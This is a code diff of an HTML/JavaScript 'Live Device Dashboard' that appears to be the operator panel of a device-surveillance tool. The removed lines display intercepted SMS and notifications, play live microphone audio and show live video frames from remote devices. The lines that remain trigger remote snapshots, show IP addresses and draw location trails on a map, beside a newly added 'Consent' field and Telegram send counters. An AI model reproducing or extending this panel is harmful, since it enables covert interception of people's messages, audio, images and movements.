@@ -2,8 +2,22 @@
 <html>
 
 <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Live Device Dashboard - Pro Edition</title>
+        <link rel="manifest" href="/static/manifest.json">
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="theme-color" content="#000000">
+        <link rel="apple-touch-icon" href="/static/icon-192.png">
     <link rel="stylesheet" href="/static/style.css">
+        <script>
+            if ('serviceWorker' in navigator) {
+                window.addEventListener('load', () => {
+                    navigator.serviceWorker.register('/static/sw.js');
+                });
+            }
+        </script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
@@ -52,8 +66,7 @@
         .online { color: #00ff9c; font-weight: bold; }
         .offline { color: #ff4d4d; font-weight: bold; }
 
-        /* 🎥 Live Stream Viewport */
-        .live-stream-box {
+        .snapshot-box {
             width: 100%;
             height: 120px;
             background: #000;
@@ -66,13 +79,13 @@
             overflow: hidden;
         }
 
-        .live-frame {
+        .snapshot-frame {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
 
-        .media-debug {
+        .snapshot-debug {
             margin-top: 10px;
             padding: 8px;
             border-radius: 6px;
@@ -82,7 +95,7 @@
             color: #bdbdbd;
         }
 
-        .media-debug strong {
+        .snapshot-debug strong {
             color: #00ff9c;
         }
 
@@ -108,7 +121,7 @@
             border: 2px solid #333;
         }
 
-        /* 📱 SMS / Notification Log Table */
+        /* ⚠️ System Alert Table */
         #log-container {
             width: 95%;
             margin: 20px auto;
@@ -144,38 +157,7 @@
 
         .snapshot:hover { transform: scale(1.05); }
 
-        #audio-panel {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: #111;
-            border-top: 2px solid #00ff9c;
-            display: flex;
-            gap: 14px;
-            align-items: center;
-            justify-content: center;
-            padding: 10px 20px;
-            z-index: 9999;
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.6);
-        }
-
-        #audio-panel label {
-            color: #00ff9c;
-            font-weight: bold;
-            font-size: 14px;
-            white-space: nowrap;
-        }
-
-        #audio-player {
-            flex: 1;
-            max-width: 480px;
-            height: 36px;
-        }
-
-        body {
-            padding-bottom: 80px;
-        }
+        body { padding-bottom: 20px; }
     </style>
 </head>
 
@@ -193,8 +175,9 @@
         Uptime: <span id="metric-uptime">--</span> |
         Dashboard Viewers: <span id="metric-viewers">0</span> |
         Telemetry/s: <span id="metric-telemetry-rate">0</span> |
-        Frames/s: <span id="metric-frame-rate">0</span> |
-        Audio/s: <span id="metric-audio-rate">0</span>
+        Alerts/s: <span id="metric-alert-rate">0</span> |
+        Telegram sent/s: <span id="metric-telegram-sent-rate">0</span> |
+        Telegram failed/s: <span id="metric-telegram-failed-rate">0</span>
     </div>
 
     <div id="devices"></div>
@@ -202,29 +185,23 @@
     <div id="map"></div>
 
     <div id="log-container">
-        <h3>📱 Intercepted SMS & Notifications</h3>
+        <h3>⚠️ System Alerts</h3>
         <table>
             <thead>
                 <tr>
                     <th>Device</th>
-                    <th>Source/Sender</th>
-                    <th>Message Content</th>
+                    <th>Level</th>
+                    <th>Message</th>
                     <th>Time</th>
                 </tr>
             </thead>
-            <tbody id="notif-body">
+            <tbody id="alert-body">
                 </tbody>
         </table>
     </div>
 
     <h3>📸 Captured Snapshots</h3>
     <div id="snapshots"></div>
-
-    <div id="audio-panel">
-        <label>🎙️ Live Mic Audio</label>
-        <audio id="audio-player" autoplay controls></audio>
-        <button id="enable-audio">🔊 Enable Audio</button>
-    </div>
 
     <script>
         const socket = io({
@@ -237,76 +214,19 @@
         const MAX_TRAIL_POINTS = 120;
         const MAX_TRAIL_DEVICES = 80;
         const MIN_TRAIL_DELTA = 0.0002;
-        const MAX_NOTIFICATIONS = 100;
+        const MAX_ALERTS = 100;
         const MAX_SNAPSHOTS = 50;
-        const FRAME_RENDER_INTERVAL_MS = 100;
+        const latestSnapshotByDevice = {};
+        const snapshotStatsByDevice = {};
 
-        const lastFrameRenderByDevice = {};
-        const latestFrameByDevice = {};
-        const mediaStatsByDevice = {};
-        const audioQueue = [];
-        const MAX_AUDIO_QUEUE = 120;
-        let audioPlaying = false;
-        let audioUnlocked = false;
-
-        const audio = document.getElementById("audio-player");
-        const enableAudioBtn = document.getElementById("enable-audio");
-
-        async function unlockAudio() {
-            try {
-                await audio.play();
-                audioUnlocked = true;
-                if (enableAudioBtn) enableAudioBtn.textContent = "✅ Live Audio Enabled";
-                playNextAudioChunk();
-            } catch (_) {
-                audioUnlocked = false;
-            }
-        }
-
-        if (enableAudioBtn) {
-            enableAudioBtn.addEventListener("click", unlockAudio);
-        }
-
-        function revokeAudioUrl(url) {
-            if (url && url.startsWith('blob:')) {
-                URL.revokeObjectURL(url);
-            }
-        }
-
-        function playNextAudioChunk() {
-            if (!audioUnlocked || audioPlaying || audioQueue.length === 0) {
-                return;
-            }
-
-            const nextUrl = audioQueue.shift();
-            audioPlaying = true;
-            audio.src = nextUrl;
-
-            audio.play().catch(() => {
-                audioPlaying = false;
-                audioQueue.unshift(nextUrl);
-            });
-        }
-
-        function onAudioChunkFinished() {
-            revokeAudioUrl(audio.src || '');
-            audioPlaying = false;
-            playNextAudioChunk();
-        }
-
-        audio.addEventListener('ended', onAudioChunkFinished);
-        audio.addEventListener('error', onAudioChunkFinished);
-
-        function getMediaStats(deviceId) {
-            if (!mediaStatsByDevice[deviceId]) {
-                mediaStatsByDevice[deviceId] = {
-                    frames: 0,
-                    audioChunks: 0,
-                    lastFrameAt: 0,
-                    lastAudioAt: 0,
+        function getSnapshotStats(deviceId) {
+            if (!snapshotStatsByDevice[deviceId]) {
+                snapshotStatsByDevice[deviceId] = {
+                    snapshots: 0,
+                    lastSnapshotAt: 0,
                 };
             }
-            return mediaStatsByDevice[deviceId];
+            return snapshotStatsByDevice[deviceId];
         }
 
         function formatAge(timestamp) {
@@ -315,19 +235,15 @@
             return `${seconds}s ago`;
         }
 
-        function paintMediaStats(deviceId) {
-            const stats = mediaStatsByDevice[deviceId];
+        function paintSnapshotStats(deviceId) {
+            const stats = snapshotStatsByDevice[deviceId];
             if (!stats) return;
 
-            const framesEl = document.getElementById(`media-frames-${deviceId}`);
-            const audioEl = document.getElementById(`media-audio-${deviceId}`);
-            const frameAgeEl = document.getElementById(`media-frame-age-${deviceId}`);
-            const audioAgeEl = document.getElementById(`media-audio-age-${deviceId}`);
+            const countEl = document.getElementById(`snapshots-count-${deviceId}`);
+            const ageEl = document.getElementById(`snapshot-age-${deviceId}`);
 
-            if (framesEl) framesEl.textContent = String(stats.frames);
-            if (audioEl) audioEl.textContent = String(stats.audioChunks);
-            if (frameAgeEl) frameAgeEl.textContent = formatAge(stats.lastFrameAt);
-            if (audioAgeEl) audioAgeEl.textContent = formatAge(stats.lastAudioAt);
+            if (countEl) countEl.textContent = String(stats.snapshots);
+            if (ageEl) ageEl.textContent = formatAge(stats.lastSnapshotAt);
         }
 
         // ------------------------
@@ -373,28 +289,29 @@
             for (const id in devices) {
                 const d = devices[id];
                 if (d.status === "online") online++;
-                const existingFrame = latestFrameByDevice[id] || "";
-                const noFeedStyle = existingFrame ? "display:none;" : "position:absolute; font-size:10px; color:#555;";
-                const stats = getMediaStats(id);
+                const existingSnapshot = latestSnapshotByDevice[id] || "";
+                const noFeedStyle = existingSnapshot ? "display:none;" : "position:absolute; font-size:10px; color:#555;";
+                const stats = getSnapshotStats(id);
 
                 htmlParts.push(`
                     <div class="card">
-                        <div class="live-stream-box">
-                            <img id="live-${id}" class="live-frame" src="${existingFrame}">
-                            <div id="label-${id}" style="${noFeedStyle}">No Feed</div>
+                        <div class="snapshot-box">
+                            <img id="live-${id}" class="snapshot-frame" src="${existingSnapshot}">
+                            <div id="label-${id}" style="${noFeedStyle}">No Snapshot Yet</div>
                         </div>
                         <br>
                         <b>ID:</b> ${id.substring(0, 10)}...<br>
                         <b>Model:</b> ${d.model || "Unknown"}<br>
+                        <b>Browser:</b> ${d.browser || "--"}<br>
+                        <b>IP:</b> ${d.ip_address || "--"}<br>
+                        <b>Consent:</b> ${d.consent_granted ? 'Yes' : 'No'}<br>
                         <b>Network:</b> ${d.network || "--"}<br>
                         <b>Battery:</b> ${d.battery || "--"} (${d.charging ? '⚡' : '🔋'})<br>
                         <b>Status:</b> <span class="${d.status === "online" ? "online" : "offline"}">${d.status}</span>
 
-                        <div class="media-debug">
-                            <div><strong>Frames:</strong> <span id="media-frames-${id}">${stats.frames}</span></div>
-                            <div><strong>Last frame:</strong> <span id="media-frame-age-${id}">${formatAge(stats.lastFrameAt)}</span></div>
-                            <div><strong>Audio chunks:</strong> <span id="media-audio-${id}">${stats.audioChunks}</span></div>
-                            <div><strong>Last audio:</strong> <span id="media-audio-age-${id}">${formatAge(stats.lastAudioAt)}</span></div>
+                        <div class="snapshot-debug">
+                            <div><strong>Snapshots:</strong> <span id="snapshots-count-${id}">${stats.snapshots}</span></div>
+                            <div><strong>Last snapshot:</strong> <span id="snapshot-age-${id}">${formatAge(stats.lastSnapshotAt)}</span></div>
                         </div>
 
                         <button onclick="takePhoto('${id}')">📸 Trigger Snapshot</button>
@@ -432,7 +349,7 @@
             container.innerHTML = htmlParts.join("");
 
             activeIds.forEach((id) => {
-                paintMediaStats(id);
+                paintSnapshotStats(id);
             });
 
             Object.keys(markers).forEach((id) => {
@@ -442,9 +359,8 @@
                     delete markers[id];
                     delete trails[id];
                     delete lastTrailPointByDevice[id];
-                    delete lastFrameRenderByDevice[id];
-                    delete latestFrameByDevice[id];
-                    delete mediaStatsByDevice[id];
+                    delete latestSnapshotByDevice[id];
+                    delete snapshotStatsByDevice[id];
                 }
             });
 
@@ -453,67 +369,21 @@
         });
 
         // ------------------------
-        // 🎥 LIVE VIDEO RENDERER
+        // ⚠️ SYSTEM ALERT RECEIVER
         // ------------------------
-        socket.on("render_frame", data => {
-            const now = Date.now();
-            const last = lastFrameRenderByDevice[data.device_id] || 0;
-            if ((now - last) < FRAME_RENDER_INTERVAL_MS) return;
-            lastFrameRenderByDevice[data.device_id] = now;
-            latestFrameByDevice[data.device_id] = data.frame;
-            const stats = getMediaStats(data.device_id);
-            stats.frames += 1;
-            stats.lastFrameAt = now;
-
-            const imgElement = document.getElementById(`live-${data.device_id}`);
-            const label = document.getElementById(`label-${data.device_id}`);
-            if (imgElement) {
-                imgElement.src = data.frame;
-                if (label) label.style.display = "none";
-            }
-            paintMediaStats(data.device_id);
-        });
-
-        // ------------------------
-        // 🔊 AUDIO STREAMING ENGINE
-        // ------------------------
-        socket.on("play_audio", data => {
-            const deviceId = data.device_id || 'unknown';
-            const stats = getMediaStats(deviceId);
-            stats.audioChunks += 1;
-            stats.lastAudioAt = Date.now();
-            const blob = new Blob([data.audio], { type: 'audio/webm; codecs=opus' });
-            const url = URL.createObjectURL(blob);
-            if (audioQueue.length >= MAX_AUDIO_QUEUE) {
-                revokeAudioUrl(audioQueue.shift());
-            }
-            audioQueue.push(url);
-            playNextAudioChunk();
-            paintMediaStats(deviceId);
-        });
-
-        setInterval(() => {
-            Object.keys(mediaStatsByDevice).forEach((deviceId) => {
-                paintMediaStats(deviceId);
-            });
-        }, 1000);
-
-        // ------------------------
-        // 📱 SMS / NOTIFICATION RECEIVER
-        // ------------------------
-        socket.on("new_notification_alert", data => {
-            const tableBody = document.getElementById("notif-body");
+        socket.on("system_alert", data => {
+            const tableBody = document.getElementById("alert-body");
             const row = `
                 <tr>
                     <td style="color:#00ff9c">${data.device_id.substring(0, 8)}</td>
-                    <td><b>${data.title}</b></td>
-                    <td>${data.body}</td>
-                    <td>${new Date().toLocaleTimeString()}</td>
+                    <td><b>${data.level || 'info'}</b></td>
+                    <td>${data.message || ''}</td>
+                    <td>${new Date(data.timestamp ? data.timestamp * 1000 : Date.now()).toLocaleTimeString()}</td>
                 </tr>
             `;
             tableBody.insertAdjacentHTML('afterbegin', row);
 
-            while (tableBody.children.length > MAX_NOTIFICATIONS) {
+            while (tableBody.children.length > MAX_ALERTS) {
                 tableBody.removeChild(tableBody.lastElementChild);
             }
         });
@@ -526,11 +396,23 @@
         }
 
         socket.on("view_snapshot", (data) => {
+            latestSnapshotByDevice[data.device_id] = data.image;
+            const stats = getSnapshotStats(data.device_id);
+            stats.snapshots += 1;
+            stats.lastSnapshotAt = Date.now();
             const box = document.getElementById("snapshots");
             const el = document.createElement("img");
             el.src = data.image;
             el.className = "snapshot";
             box.prepend(el);
+
+            const imgElement = document.getElementById(`live-${data.device_id}`);
+            const label = document.getElementById(`label-${data.device_id}`);
+            if (imgElement) {
+                imgElement.src = data.image;
+                if (label) label.style.display = "none";
+            }
+            paintSnapshotStats(data.device_id);
 
             while (box.children.length > MAX_SNAPSHOTS) {
                 box.removeChild(box.lastElementChild);
@@ -554,8 +436,9 @@
                 document.getElementById('metric-uptime').innerText = formatUptime(data.uptime_seconds);
                 document.getElementById('metric-viewers').innerText = data.sockets.dashboard_viewers;
                 document.getElementById('metric-telemetry-rate').innerText = data.rates_per_second.telemetry_events;
-                document.getElementById('metric-frame-rate').innerText = data.rates_per_second.stream_frames;
-                document.getElementById('metric-audio-rate').innerText = data.rates_per_second.audio_chunks;
+                document.getElementById('metric-alert-rate').innerText = data.rates_per_second.system_alerts;
+                document.getElementById('metric-telegram-sent-rate').innerText = data.rates_per_second.telegram_sent;
+                document.getElementById('metric-telegram-failed-rate').innerText = data.rates_per_second.telegram_failed;
             } catch (error) {
                 console.log('Metrics refresh failed', error);
             }
